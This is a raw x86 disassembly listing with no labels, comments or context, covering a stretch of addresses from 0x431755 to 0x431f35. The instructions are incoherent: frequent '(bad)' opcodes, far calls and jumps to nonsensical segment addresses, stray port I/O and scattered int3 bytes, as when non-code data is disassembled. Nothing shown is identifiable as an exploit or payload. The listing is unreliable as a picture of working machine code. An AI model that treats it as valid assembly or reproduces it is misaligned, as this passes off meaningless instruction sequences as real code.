  431755:	adc    al,0x0
  431757:	sub    BYTE PTR [eax],al
  431759:	(bad)  
  43175a:	push   DWORD PTR [esi]
  43175c:	sbb    al,0x4c
  43175e:	mov    edi,edi
  431760:	sbb    esp,esp
  431762:	push   ebp
  431763:	(bad)  
  431764:	(bad)  
  431765:	cmp    bh,bh
  431767:	fisttp QWORD PTR [ecx+0x295fffff]
  43176d:	sub    eax,DWORD PTR [eax]
  43176f:	sub    esp,0x6e
  431772:	call   0x83cc:0xcc1183ff
  431779:	inc    DWORD PTR [eax]
  43177b:	jl     0x4317c8
  43177d:	add    ah,cl
  43177f:	add    dh,dh
  431781:	(bad)  
  431782:	nop
  431783:	or     esp,0x1b
  431786:	add    bh,cl
  431788:	(bad)  
  431789:	(bad)  
  43178a:	dec    DWORD PTR [ebx-0xbc18]
  431790:	jo     0x431784
  431792:	int    0xff
  431794:	add    BYTE PTR [ebp+0x836eff],bl
  43179a:	call   FWORD PTR [edx]
  43179c:	dec    eax
  43179d:	pop    es
  43179e:	add    ah,cl
  4317a0:	jno    0x431788
  4317a2:	or     bh,bh
  4317a4:	add    BYTE PTR [ebx],dh
  4317a6:	dec    DWORD PTR [edx]
  4317a8:	mov    DWORD PTR [eax],eax
  4317aa:	call   FWORD PTR [edi]
  4317ac:	push   ebx
  4317ad:	lods   eax,DWORD PTR ds:[esi]
  4317ae:	mov    DWORD PTR [eax],eax
  4317b0:	dec    esp
  4317b1:	add    BYTE PTR [ebp+0x22ffff],bh
  4317b7:	aam    0xcc
  4317b9:	dec    DWORD PTR [ecx-0xbcad29]
  4317bf:	and    DWORD PTR [ebx-0x75],0xffffff9f
  4317c3:	(bad)  
  4317c4:	call   FWORD PTR [edx-0x1]
  4317c7:	mov    edx,0x3eff00ff
  4317cc:	into   
  4317cd:	ins    DWORD PTR es:[edi],dx
  4317ce:	add    BYTE PTR [eax],al
  4317d0:	pop    ecx
  4317d1:	adc    DWORD PTR [ecx],0xe0ffff
  4317d7:	push   edi
  4317d8:	add    bh,bh
  4317da:	dec    DWORD PTR [ebp-0x86fb]
  4317e0:	mov    cl,0x7d
  4317e2:	dec    edx
  4317e3:	cmp    edi,0xffffffff
  4317e6:	int3   
  4317e7:	fild   WORD PTR [eax]
  4317e9:	(bad)  
  4317ea:	dec    DWORD PTR [esi-0x9]
  4317ed:	or     DWORD PTR [ecx+0x40f8c389],ecx
  4317f3:	add    bh,bh
  4317f5:	loope  0x43177a
  4317f7:	sbb    bh,bh
  4317f9:	mov    DWORD PTR [eax],eax
  4317fb:	cmp    ah,BYTE PTR [edi+0x1e]
  4317fe:	(bad)  
  4317ff:	inc    ebp
  431801:	push   edx
  431802:	xlat   BYTE PTR ds:[ebx]
  431803:	(bad)  
  431804:	(bad)  
  431805:	fild   DWORD PTR [eax]
  431807:	outs   dx,DWORD PTR ds:[esi]
  431808:	add    BYTE PTR [ecx-0x33c53f01],cl
  43180e:	mov    esp,ecx
  431810:	xchg   esp,eax
  431811:	cmc    
  431812:	jne    0x431814
  431814:	dec    DWORD PTR [edx]
  431816:	add    BYTE PTR [edi],ch
  431818:	cmp    edi,0xffffffcc
  43181b:	sub    eax,0x8316e5
  431820:	cmp    al,0x5e
  431822:	cmp    ecx,DWORD PTR [ecx-0x20003601]
  431828:	add    bh,bh
  43182a:	int3   
  43182b:	fs xchg esi,eax
  43182d:	aam    0x0
  43182f:	(bad)  
  431830:	out    dx,al
  431831:	sub    BYTE PTR [eax],0x89
  431834:	add    DWORD PTR [edi+0x783],0x0
  43183b:	jmp    0xd911:0xff890227
  431842:	xchg   ebp,eax
  431843:	add    BYTE PTR [ebx+0xd1ff3a],al
  431849:	add    bh,bh
  43184b:	cmp    edi,DWORD PTR [eax+edx*1-0x1]
  43184f:	call   FWORD PTR [ebx]
  431851:	push   cs
  431852:	sti    
  431853:	inc    DWORD PTR [ebx-0x7cceffb7]
  431859:	dec    esp
  43185b:	and    BYTE PTR [eax],dh
  43185d:	push   ds
  43185e:	(bad)  
  43185f:	(bad)  
  431860:	stc    
  431861:	sahf   
  431862:	mov    eax,0x1ffff
  431867:	outs   dx,BYTE PTR ds:[esi]
  431868:	(bad)  
  431869:	(bad)  
  43186a:	jmp    FWORD PTR [edi+0xfde0]
  431870:	mov    ebp,0xff18a3
  431875:	pop    esp
  431876:	call   FWORD PTR [esi-0x34]
  431879:	inc    DWORD PTR [ebx+0x471b14]
  43187f:	add    DWORD PTR [ebx+0x67],0xffffffd9
  431883:	mov    edi,edi
  431885:	(bad)  
  431886:	add    BYTE PTR [esi-0x1],ah
  431889:	inc    DWORD PTR [eax]
  43188b:	daa    
  43188c:	xchg   BYTE PTR [esi-0x1],al
  43188f:	(bad)  
  431890:	fild   QWORD PTR [esi]
  431892:	push   eax
  431893:	dec    esp
  431895:	jnp    0x43181a
  431897:	sbb    edi,edi
  431899:	(bad)  
  43189a:	dec    DWORD PTR [ecx-0x7c7c45d3]
  4318a0:	or     cl,BYTE PTR [ebp-0x10ff00f2]
  4318a6:	add    BYTE PTR [edx-0x2bff0001],bh
  4318ac:	and    eax,0x60ccccc1
  4318b1:	push   ss
  4318b2:	(bad)  
  4318b3:	int3   
  4318b4:	sub    DWORD PTR ds:0xff0063ff,0xffffffff
  4318bb:	xlat   BYTE PTR ds:[ebx]
  4318bc:	test   BYTE PTR [esp+ecx*8],0x0
  4318c0:	rcl    DWORD PTR [ebx-0x6c00003d],cl
  4318c6:	push   DWORD PTR [ebx-0x7d]
  4318c9:	add    BYTE PTR [eax],al
  4318cb:	rol    al,0xc8
  4318ce:	(bad)  
  4318cf:	push   DWORD PTR [ecx-0x7600671f]
  4318d5:	int    0x0
  4318d7:	push   esi
  4318d8:	(bad)  
  4318d9:	(bad)  
  4318da:	jmp    DWORD PTR [edi]
  4318dc:	mov    eax,0x21ff0020
  4318e1:	adc    al,0x49
  4318e3:	inc    DWORD PTR [eax]
  4318e5:	mov    eax,ds:0xffff78ff
  4318ea:	sub    DWORD PTR [ecx-0x31],0x10
  4318ee:	inc    DWORD PTR [eax]
  4318f0:	in     eax,dx
  4318f1:	lea    edx,[esi+0x0]
  4318f4:	call   ebx
  4318f6:	add    BYTE PTR [edi+0x3ccc8383],dl
  4318fc:	in     eax,0xa9
  4318fe:	int3   
  4318ff:	inc    DWORD PTR [edx]
  431901:	inc    edi
  431902:	inc    DWORD PTR fs:[eax]
  431905:	push   eax
  431906:	(bad)  
  431907:	jns    0x431909
  431909:	(bad)  
  43190a:	jmp    FWORD PTR [ecx+0xcc859b]
  431910:	xor    ch,bl
  431912:	or     BYTE PTR [ecx-0x1b331500],0x0
  431919:	inc    DWORD PTR [ebx-0x25cad1]
  43191f:	mov    DWORD PTR [eax+0x89c444],ecx
  431925:	sbb    DWORD PTR [eax],eax
  431927:	add    edi,edi
  431929:	(bad)  
  43192a:	(bad)  
  43192b:	out    dx,al
  43192c:	cmc    
  43192d:	or     eax,DWORD PTR [ebx-0x20daff7d]
  431933:	inc    DWORD PTR [eax]
  431935:	sahf   
  431936:	add    BYTE PTR [ebx+0x7883cc83],dh
  43193c:	inc    ebp
  43193d:	repz add BYTE PTR [eax],al
  431940:	jl     0x4318f5
  431942:	enter  0xcc,0xe9
  431946:	xor    DWORD PTR [esi-0x1],0xffffffcc
  43194a:	call   DWORD PTR [esi+0x11]
  43194d:	adc    cl,BYTE PTR [ecx+0x9c0c6cc]
  431953:	inc    DWORD PTR [eax]
  431955:	mov    ebx,0x83ffa100
  43195a:	add    BYTE PTR [edx-0x7c004809],bh
  431960:	retf   0xf5fd
  431963:	inc    DWORD PTR [ebx-0x76820099]
  431969:	int3   
  43196a:	call   FWORD PTR [ebx]
  43196c:	and    ebp,DWORD PTR [ecx]
  43196e:	add    BYTE PTR [eax],al
  431970:	stos   DWORD PTR es:[edi],eax
  431971:	mov    cl,0xe3
  431973:	mov    DWORD PTR [eax],eax
  431975:	mov    DWORD PTR gs:[eax+0x5ffffff],edx
  43197c:	mov    fs,ecx
  43197e:	int3   
  43197f:	call   DWORD PTR [ecx]
  431981:	adc    al,0x37
  431983:	(bad)  
  431984:	(bad)  
  431985:	jl     0x431986
  431987:	call   0x5f5f:0x2100ffff
  43198e:	(bad)  
  43198f:	jmp    DWORD PTR [edi+0x24]
  431992:	scas   al,BYTE PTR es:[edi]
  431993:	(bad)  
  431994:	jmp    DWORD PTR [ebx-0x100]
  43199a:	dec    DWORD PTR [edx-0x2c]
  43199d:	xor    ah,cl
  43199f:	or     DWORD PTR [edi+eax*8],0xffffffb2
  4319a3:	add    bh,bh
  4319a5:	xchg   edx,eax
  4319a6:	push   DWORD PTR [eax+eax*1]
  4319a9:	add    DWORD PTR [eax],0x24
  4319ac:	push   edi
  4319ad:	hlt    
  4319ae:	add    bh,bh
  4319b0:	fnstenv [esi+esi*4-0xa7d00]
  4319b7:	add    edi,edi
  4319b9:	cmp    edi,0xffffffa1
  4319bc:	mov    esp,0x783ff02
  4319c1:	pusha  
  4319c2:	clc    
  4319c3:	inc    DWORD PTR [eax]
  4319c5:	ins    BYTE PTR es:[edi],dx
  4319c6:	dec    DWORD PTR [ebx-0x1b000000]
  4319cc:	das    
  4319cd:	add    DWORD PTR [ecx-0x319b1f01],ecx
  4319d3:	dec    DWORD PTR [ecx-0x7200b5]
  4319d9:	add    bh,bh
  4319db:	sub    ch,BYTE PTR [esi+0x2e00ff8d]
  4319e1:	jns    0x4319d3
  4319e3:	add    BYTE PTR [eax],al
  4319e5:	mov    al,ds:0xff008dcc
  4319ea:	and    DWORD PTR [edx],0x3c
  4319ed:	fwait
  4319ee:	(bad)  
  4319ef:	push   DWORD PTR [eax-0x5069]
  4319f5:	mov    ds:0xffcc7dff,al
  4319fa:	add    BYTE PTR [edi+0x1b],bl
  4319fd:	fadd   DWORD PTR [ebx-0x7d91b47d]
  431a03:	int3   
  431a04:	jmp    DWORD PTR [esi-0x1]
  431a07:	xchg   ecx,eax
  431a08:	(bad)  
  431a09:	inc    DWORD PTR [ebx+0xd60b1a]
  431a0f:	and    DWORD PTR [esi-0xff3a12],0xfffffffb
  431a16:	or     DWORD PTR [ecx-0x1],0x0
  431a1a:	add    BYTE PTR [edx],bl
  431a1c:	sub    DWORD PTR [eax+0x36028900],0x7300cc67
  431a26:	mov    DWORD PTR [edi+0x750000ff],ecx
  431a2c:	xchg   edx,eax
  431a2d:	jl     0x4319fb
  431a2f:	dec    ecx
  431a31:	jmp    0x431a71
  431a33:	(bad)  
  431a34:	inc    DWORD PTR [edx-0xffc801]
  431a3a:	push   esi
  431a3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431a3d:	in     al,dx
  431a3e:	add    bh,bh
  431a40:	out    dx,al
  431a41:	mov    dl,0x1e
  431a43:	add    BYTE PTR [eax],al
  431a45:	idiv   bh
  431a47:	int3   
  431a48:	inc    DWORD PTR [eax]
  431a4a:	push   DWORD PTR [edx]
  431a4c:	mov    dh,0x46
  431a4e:	inc    DWORD PTR [eax]
  431a50:	scas   eax,DWORD PTR es:[edi]
  431a51:	shr    ebp,1
  431a53:	inc    DWORD PTR [eax]
  431a55:	jae    0x431a56
  431a57:	or     bh,bh
  431a59:	inc    DWORD PTR [ebx-0x3368fe47]
  431a5f:	inc    DWORD PTR [esi-0x70ab]
  431a65:	sub    eax,0x895000
  431a6a:	or     DWORD PTR [edx],0x26
  431a6d:	ret    0x8300
  431a70:	ja     0x431a6e
  431a72:	xchg   ebx,eax
  431a73:	add    BYTE PTR [eax],al
  431a75:	lea    eax,[eax]
  431a77:	hlt    
  431a78:	inc    DWORD PTR [eax]
  431a7a:	cmp    DWORD PTR [ecx+0x5b],0x71
  431a7e:	int3   
  431a7f:	jmp    DWORD PTR [edi+ebx*1]
  431a82:	test   edi,edi
  431a84:	push   DWORD PTR [ebp-0x1]
  431a87:	pop    ss
  431a88:	add    BYTE PTR [eax],al
  431a8a:	or     DWORD PTR ds:0xff17b7,0xffffff87
  431a91:	mov    esi,0xc0ff00dc
  431a96:	call   FWORD PTR [edx]
  431a98:	add    BYTE PTR [eax],al
  431a9a:	int3   
  431a9b:	mov    ds:0x83ffc277,al
  431aa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431aa1:	repnz lahf 
  431aa3:	(bad)  
  431aa4:	dec    DWORD PTR [ebx+0x0]
  431aa7:	rol    DWORD PTR [eax],1
  431aa9:	cmp    edi,0xffffffe6
  431aac:	dec    esp
  431aad:	inc    esi
  431aae:	inc    DWORD PTR [ebx-0xd7b9d4]
  431ab4:	add    BYTE PTR [edx],al
  431ab6:	add    bh,bh
  431ab8:	cmp    edi,0x0
  431abb:	mov    esi,es
  431abd:	xlat   BYTE PTR ds:[ebx]
  431abe:	(bad)  
  431abf:	(bad)  
  431ac0:	fimul  WORD PTR [edi]
  431ac2:	ja     0x431ac3
  431ac4:	push   DWORD PTR [ecx+0x0]
  431ac7:	rol    DWORD PTR [eax],cl
  431ac9:	add    BYTE PTR [eax],al
  431acb:	and    al,0x6a
  431acd:	daa    
  431ace:	dec    esp
  431ad0:	xor    DWORD PTR [edi+esi*4],edi
  431ad3:	mov    edi,edi
  431ad5:	adc    al,0x0
  431ad7:	mov    esi,0x290000ff
  431adc:	xor    BYTE PTR [ebp+0x0],bh
  431adf:	jmp    FWORD PTR [ecx+0xd1b9]
  431ae5:	push   esp
  431ae6:	add    BYTE PTR [ebx-0x1],al
  431ae9:	add    BYTE PTR [ebx+0xf3dbf],al
  431aef:	add    BYTE PTR [ebx+0x9],bh
  431af2:	ret    
  431af3:	add    DWORD PTR [eax],0x3f
  431af6:	mov    edx,edi
  431af8:	add    bh,bh
  431afa:	dec    DWORD PTR [eax+0xff3874]
  431b00:	loope  0x431b0e
  431b02:	inc    edi
  431b03:	add    bh,bh
  431b05:	data16 add BYTE PTR [ebx-0x1],al
  431b09:	add    BYTE PTR [eax],al
  431b0b:	jge    0x431b03
  431b0d:	loopne 0x431b0e
  431b0f:	mov    DWORD PTR [ecx-0xff56c2],ebx
  431b15:	inc    edi
  431b16:	sbb    ecx,0xffffffff
  431b19:	(bad)  
  431b1a:	jmp    FWORD PTR [esi-0xffb069]
  431b20:	and    BYTE PTR [ebx-0x22ff00af],ch
  431b26:	int3   
  431b27:	xor    al,0x83
  431b29:	add    ah,cl
  431b2b:	inc    eax
  431b2c:	push   ebx
  431b2d:	dec    esp
  431b2e:	(bad)  
  431b2f:	(bad)  
  431b30:	jge    0x431af4
  431b32:	inc    eax
  431b33:	(bad)  
  431b34:	(bad)  
  431b35:	cli    
  431b36:	dec    ebx
  431b38:	inc    DWORD PTR [eax]
  431b3a:	add    BYTE PTR [eax],ah
  431b3c:	mov    bl,0x27
  431b3e:	add    BYTE PTR [ebx-0x8571ff],al
  431b44:	call   FWORD PTR [ebp+0x0]
  431b47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431b48:	dec    DWORD PTR [ecx-0x1a13f300]
  431b4e:	inc    DWORD PTR [eax]
  431b50:	loope  0x431b6e
  431b52:	sub    al,0x0
  431b54:	call   DWORD PTR [ebx+eax*4-0x33]
  431b58:	add    BYTE PTR [eax],al
  431b5a:	mov    edx,esp
  431b5c:	sub    ecx,DWORD PTR [eax+0x0]
  431b5f:	add    BYTE PTR [ecx+0x46],bh
  431b62:	inc    esp
  431b63:	add    BYTE PTR [eax],al
  431b65:	retf   0x9300
  431b68:	inc    DWORD PTR [eax]
  431b6a:	add    dl,al
  431b6c:	jnp    0x431b1f
  431b6e:	inc    DWORD PTR [eax]
  431b70:	out    0x4d,al
  431b72:	dec    ebx
  431b73:	mov    esp,ecx
  431b75:	push   0x0
  431b77:	in     al,dx
  431b78:	(bad)  
  431b79:	inc    DWORD PTR [eax]
  431b7b:	pop    esi
  431b7c:	dec    edx
  431b7d:	add    edi,edi
  431b7f:	(bad)  
  431b80:	jp     0x431b15
  431b82:	daa    
  431b83:	add    BYTE PTR [eax],al
  431b85:	adc    edi,edi
  431b87:	in     al,dx
  431b88:	add    BYTE PTR [ecx-0x2176737d],cl
  431b8e:	(bad)  
  431b8f:	push   DWORD PTR [esi]
  431b91:	adc    DWORD PTR [edi+edi*8-0x1],edx
  431b95:	xor    eax,0xfffff883
  431b9a:	(bad)  
  431b9b:	cmp    eax,DWORD PTR [edx+0x2583ccd0]
  431ba1:	push   ds
  431ba2:	dec    edx
  431ba3:	dec    esp
  431ba5:	(bad)  
  431ba7:	loope  0x431b32
  431ba9:	add    BYTE PTR [eax],al
  431bab:	jnp    0x431bbd
  431bad:	pop    ebx
  431bae:	inc    DWORD PTR [ebx-0xc87c87]
  431bb4:	add    BYTE PTR [esp+ecx*8],dl
  431bb7:	fisttp WORD PTR [ecx-0x4ca00077]
  431bbd:	and    eax,0x7853ffff
  431bc2:	adc    ah,cl
  431bc4:	call   DWORD PTR [ebx+eax*4]
  431bc7:	loopne 0x431bc9
  431bc9:	add    bh,bh
  431bcb:	inc    ecx
  431bcc:	mov    dl,0x3a
  431bce:	add    bh,bh
  431bd0:	or     al,0x2d
  431bd2:	loop   0x431bd3
  431bd4:	inc    DWORD PTR [eax-0xb701]
  431bda:	(bad)  
  431bdb:	out    dx,al
  431bdc:	add    DWORD PTR [bx+si],eax
  431bdf:	call   FWORD PTR [esi]
  431be1:	scas   eax,DWORD PTR es:[edi]
  431be2:	jne    0x431be3
  431be4:	(bad)  
  431be5:	cmp    al,0xff
  431be7:	adc    ecx,esp
  431be9:	cmp    edi,0x1b
  431bec:	jns    0x431c3c
  431bee:	add    DWORD PTR [eax],0x26
  431bf1:	jge    0x431c49
  431bf3:	add    BYTE PTR [eax],al
  431bf5:	enter  0x48ff,0xff
  431bf9:	add    bh,bh
  431bfb:	(bad)  
  431bfc:	cli    
  431bfd:	mov    al,BYTE PTR [eax]
  431bff:	add    ch,dl
  431c01:	adc    cl,dh
  431c03:	inc    DWORD PTR [eax]
  431c05:	and    eax,DWORD PTR [ebx-0x7696]
  431c0b:	ret    
  431c0c:	cmp    esp,DWORD PTR [eax+0x5cffff]
  431c12:	xchg   ebx,eax
  431c13:	add    bh,bh
  431c15:	fmul   DWORD PTR [ecx-0xff7cba]
  431c1b:	or     eax,0xff836df1
  431c20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431c21:	int    0x55
  431c23:	(bad)  
  431c24:	call   DWORD PTR [eax+eax*1]
  431c27:	or     bh,bh
  431c29:	add    bh,bh
  431c2b:	mov    BYTE PTR [edx-0x79ffff60],dh
  431c31:	pop    esp
  431c32:	ud0    eax,DWORD PTR [eax]
  431c35:	les    eax,FWORD PTR [eax]
  431c37:	inc    ebp
  431c38:	mov    edi,edi
  431c3a:	call   eax
  431c3c:	test   BYTE PTR [ebp+0x1b340083],bh
  431c42:	or     BYTE PTR [ecx-0x41ffef01],0xff
  431c49:	mov    edi,edi
  431c4b:	sti    
  431c4c:	push   0x7eff008e
  431c51:	ret    
  431c52:	and    bh,bh
  431c54:	mov    DWORD PTR [esi-0x77],edi
  431c57:	pop    ss
  431c58:	dec    DWORD PTR [ecx-0x2f60c87d]
  431c5e:	add    DWORD PTR [eax],0xb
  431c61:	or     al,0xbb
  431c63:	mov    edi,edi
  431c65:	adc    al,0x83
  431c67:	mov    dh,0x0
  431c69:	add    bh,bh
  431c6b:	push   DWORD PTR [esi]
  431c6d:	adc    bh,bh
  431c6f:	inc    eax
  431c71:	es mov ch,0x0
  431c74:	add    cl,dh
  431c76:	int3   
  431c77:	mov    WORD PTR [ebx+0x6586ff00],es
  431c7d:	push   esi
  431c7e:	add    bh,bh
  431c80:	mov    cs,ebp
  431c82:	out    dx,eax
  431c83:	inc    DWORD PTR [ebx-0xf760a]
  431c89:	add    BYTE PTR [ebx-0x4a58c9],al
  431c8f:	add    BYTE PTR [ebp+ebp*8+0x66],dl
  431c93:	(bad)  
  431c94:	dec    DWORD PTR [esi]
  431c96:	and    DWORD PTR ds:0x2e008300,0x58
  431c9d:	loopne 0x431c9e
  431c9f:	sub    ebp,0xffffffc7
  431ca2:	cmp    bh,0x0
  431ca5:	dec    esi
  431ca6:	and    edi,0xffffff83
  431ca9:	add    ah,cl
  431cab:	mov    dh,0xc0
  431cad:	test   edi,edi
  431caf:	dec    ecx
  431cb1:	jecxz  0x431c40
  431cb3:	add    bh,bh
  431cb5:	and    eax,0x5dcc
  431cba:	add    BYTE PTR [esi-0x7c001e2b],al
  431cc0:	adc    eax,ecx
  431cc2:	stc    
  431cc3:	add    BYTE PTR [ecx-0x8a7691],cl
  431cc9:	add    BYTE PTR [ebx+0x7587b4],al
  431ccf:	int3   
  431cd0:	stc    
  431cd1:	mov    bh,0xf7
  431cd3:	add    BYTE PTR [ebx+0x8ffb0],al
  431cd9:	(bad)  
  431cda:	call   FWORD PTR [eax]
  431cdc:	nop
  431cdd:	data16 (bad) 
  431cdf:	call   DWORD PTR [edx-0x7c6f7f]
  431ce5:	call   DWORD PTR [ebp+0x28ff8900]
  431cec:	dec    eax
  431ced:	pop    eax
  431cee:	add    ah,cl
  431cf0:	push   ecx
  431cf1:	lock sub ecx,esp
  431cf4:	inc    DWORD PTR [eax+eax*1-0x3349]
  431cfb:	fmul   st,st(3)
  431cfd:	out    dx,eax
  431cfe:	mov    edi,edi
  431d00:	enter  0xad4e,0xff
  431d04:	dec    edi
  431d06:	int3   
  431d07:	inc    ecx
  431d08:	add    DWORD PTR [eax],0xffffff89
  431d0b:	rol    edi,0xf0
  431d0e:	inc    DWORD PTR [eax]
  431d10:	stc    
  431d11:	(bad)  
  431d12:	jnp    0x431d13
  431d14:	add    BYTE PTR [edi-0x76004200],bl
  431d1a:	mov    esi,esi
  431d1c:	push   0x58ff00cb
  431d21:	mov    bl,0xf0
  431d23:	mov    DWORD PTR [ebx-0x96ff07],eax
  431d29:	inc    DWORD PTR [eax]
  431d2b:	stos   DWORD PTR es:[edi],eax
  431d2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431d2d:	fmul   st,st(4)
  431d2f:	call   DWORD PTR [edx-0x7c0071d5]
  431d35:	sub    al,0xff
  431d37:	cmp    DWORD PTR [eax],eax
  431d39:	dec    DWORD PTR [ecx+0x64f6fb]
  431d3f:	mov    DWORD PTR ds:0x89ff22ed,ebx
  431d45:	jne    0x431d47
  431d47:	adc    eax,DWORD PTR [ebx-0x2dd0001]
  431d4d:	ins    BYTE PTR es:[edi],dx
  431d4e:	inc    DWORD PTR [eax]
  431d50:	jmp    0x431d71
  431d52:	inc    ecx
  431d53:	mov    DWORD PTR [eax],eax
  431d55:	xchg   esi,eax
  431d56:	sub    edx,0xffffffcc
  431d59:	int3   
  431d5a:	add    BYTE PTR [edi-0x1a69],cl
  431d60:	rol    BYTE PTR [ebx],cl
  431d62:	(bad)  
  431d64:	dec    edx
  431d66:	push   eax
  431d68:	(bad)  
  431d69:	inc    DWORD PTR [eax]
  431d6b:	call   0xff43ea1e
  431d70:	mov    bl,0xfa
  431d72:	jmp    0x431cf7
  431d74:	add    BYTE PTR [eax-0xff6d7d],ch
  431d7a:	call   DWORD PTR [edx-0x6d]
  431d7d:	ret    0x0
  431d80:	repz bound edx,QWORD PTR [ebx-0x1]
  431d84:	add    BYTE PTR [ecx-0x1],al
  431d87:	pop    es
  431d88:	add    bh,bh
  431d8a:	(bad)  
  431d8b:	cmp    eax,0xcc9a14
  431d90:	jmp    0xffb6:0xf867
  431d97:	jle    0x431d98
  431d99:	add    BYTE PTR [ecx+0x8f3cf0],cl
  431d9f:	push   DWORD PTR [edx+0x15]
  431da2:	xor    BYTE PTR [ebx+0x6ffff600],al
  431da8:	cmp    edi,0xffffffff
  431dab:	mov    ah,0x83
  431dad:	jl     0x431d32
  431daf:	or     esp,0xffffffea
  431db2:	test   al,0x89
  431db4:	call   ecx
  431db6:	add    BYTE PTR [eax+eax*1-0x1],bl
  431dba:	sbb    DWORD PTR [edi+ecx*8+0x60ffff1a],0xffffffb7
  431dc2:	imul   ecx,DWORD PTR [ecx-0x5eff2c7d],0x4008300
  431dcc:	pusha  
  431dcd:	ds add bh,bh
  431dd0:	sbb    al,0x95
  431dd2:	add    al,0x83
  431dd4:	inc    DWORD PTR [edx+0x0]
  431dd7:	mov    DWORD PTR [eax],eax
  431dd9:	int3   
  431dda:	add    BYTE PTR [edi-0x10],dl
  431ddd:	retf   
  431dde:	add    bh,bh
  431de0:	(bad)  
  431de1:	int    0x2b
  431de3:	(bad)  
  431de4:	jmp    FWORD PTR [ebp-0x1]
  431de7:	fld    QWORD PTR [eax]
  431de9:	(bad)  
  431dea:	jmp    DWORD PTR [ecx-0x7cffa2e7]
  431df0:	xchg   esp,eax
  431df1:	push   0x42008364
  431df6:	add    BYTE PTR [ecx],bl
  431df8:	add    BYTE PTR [ecx+0x1712b400],cl
  431dfe:	inc    DWORD PTR [eax]
  431e00:	sbb    bl,BYTE PTR [ebx-0x7f]
  431e03:	inc    DWORD PTR [eax]
  431e05:	jp     0x431e07
  431e07:	out    0xff,eax
  431e09:	add    BYTE PTR [ebx-0xd0554d],al
  431e0f:	mov    DWORD PTR [edx],edx
  431e11:	mov    ds:0x7100001a,eax
  431e16:	int3   
  431e17:	sar    bh,1
  431e19:	inc    DWORD PTR [ebx-0x7cd2a6f9]
  431e1f:	add    BYTE PTR [esi+edx*2-0x1e],dh
  431e23:	(bad)  
  431e24:	dec    DWORD PTR [ebx-0x77]
  431e27:	jge    0x431e29
  431e29:	add    DWORD PTR [eax],0x3
  431e2c:	jge    0x431dfd
  431e2e:	int3   
  431e2f:	jmp    DWORD PTR [esi-0x762836]
  431e35:	imul   edi,edi,0xffff00e4
  431e3b:	pushf  
  431e3c:	xchg   ecx,eax
  431e3d:	out    0x0,al
  431e3f:	call   DWORD PTR [ebx]
  431e41:	ret    0xffd9
  431e44:	inc    DWORD PTR [edx-0x76766200]
  431e4a:	inc    DWORD PTR [esi+eiz*1+0x39]
  431e4e:	inc    DWORD PTR [eax]
  431e50:	popa   
  431e51:	push   0x60
  431e53:	add    DWORD PTR [eax],0xffffff8e
  431e56:	(bad)  
  431e57:	cli    
  431e58:	(bad)  
  431e59:	inc    DWORD PTR [eax]
  431e5b:	or     BYTE PTR [edx],dl
  431e5d:	fld    QWORD PTR [eax]
  431e5f:	add    BYTE PTR [ebx+eax*8-0x53ff7c6a],dh
  431e66:	push   esi
  431e68:	mov    edi,edi
  431e6a:	int3   
  431e6b:	call   0x7ba8:0xffff76f6
  431e72:	cmc    
  431e73:	add    BYTE PTR [eax],al
  431e75:	fdiv   st(7),st
  431e77:	scas   eax,DWORD PTR es:[edi]
  431e78:	cmp    edi,0xffffff83
  431e7b:	xlat   BYTE PTR ds:[ebx]
  431e7c:	ins    BYTE PTR es:[edi],dx
  431e7d:	test   bh,bh
  431e7f:	dec    DWORD PTR [ecx]
  431e81:	retf   0xff4d
  431e84:	int3   
  431e85:	or     DWORD PTR [eax],eax
  431e87:	dec    BYTE PTR [ecx-0x37fff34]
  431e8d:	aas    
  431e8e:	(bad)  
  431e8f:	dec    DWORD PTR [ebx-0x5a]
  431e92:	lods   eax,DWORD PTR ds:[esi]
  431e93:	add    BYTE PTR [eax],al
  431e95:	xchg   esi,eax
  431e96:	(bad)  
  431e97:	cmp    al,BYTE PTR [ebx+0x114e0000]
  431e9d:	sar    bh,0x0
  431ea0:	jl     0x431ef7
  431ea2:	scas   al,BYTE PTR es:[edi]
  431ea3:	(bad)  
  431ea4:	jmp    DWORD PTR [eax-0x1]
  431ea7:	sbb    al,0x89
  431ea9:	inc    DWORD PTR [eax]
  431eab:	jl     0x431ef9
  431ead:	out    0x89,al
  431eaf:	add    BYTE PTR ds:0xffffcd79,ah
  431eb5:	(bad)  
  431eb7:	mov    bh,0xcc
  431eb9:	inc    DWORD PTR [ebx-0x4640cc]
  431ebf:	(bad)  
  431ec0:	(bad)  
  431ec1:	rcl    DWORD PTR [ecx-0x7d],cl
  431ec4:	dec    DWORD PTR [edi]
  431ec6:	int3   
  431ec7:	jl     0x431e95
  431ec9:	add    ah,cl
  431ecb:	bound  ebp,QWORD PTR [ebp+0x6f]
  431ece:	inc    DWORD PTR [eax]
  431ed0:	inc    edi
  431ed1:	sub    al,0x7
  431ed3:	int3   
  431ed4:	add    bh,dl
  431ed6:	jmp    DWORD PTR [edx]
  431ed8:	add    bh,bh
  431eda:	add    BYTE PTR [edx],bl
  431edc:	fnstsw WORD PTR [ebx+eax*4]
  431edf:	jmp    FWORD PTR [ebp+0xcccab5]
  431ee5:	mov    esi,0xff009000
  431eea:	add    DWORD PTR [ebx],0xffffffbc
  431eed:	sbb    DWORD PTR [eax],eax
  431eef:	(bad)  
  431ef0:	jp     0x431f28
  431ef2:	adc    bh,bh
  431ef4:	add    ch,bh
  431ef6:	call   DWORD PTR [edi+edi*8+0x0]
  431efa:	dec    eax
  431efc:	rol    DWORD PTR [ecx-0x1],cl
  431eff:	int3   
  431f00:	pop    ebx
  431f01:	cmp    DWORD PTR [ebx-0x1],edi
  431f04:	(bad)  
  431f05:	jnp    0x431f06
  431f07:	or     ecx,DWORD PTR [ecx+0x4e338300]
  431f0d:	pop    esi
  431f0e:	inc    DWORD PTR [ebx-0x9654c0]
  431f14:	push   esi
  431f16:	call   FWORD PTR [esi]
  431f18:	add    BYTE PTR [eax],al
  431f1a:	inc    esi
  431f1c:	in     eax,0xb4
  431f1e:	(bad)  
  431f1f:	(bad)  
  431f20:	jge    0x431ed9
  431f22:	xor    eax,DWORD PTR [eax]
  431f24:	call   ecx
  431f26:	mov    DWORD PTR [ebp-0x34],edi
  431f29:	(bad)  
  431f2a:	dec    DWORD PTR [esi+0x67]
  431f2d:	loope  0x431eb8
  431f2f:	dec    DWORD PTR [ebx-0xc530]
  431f35:	sub    al,0xff
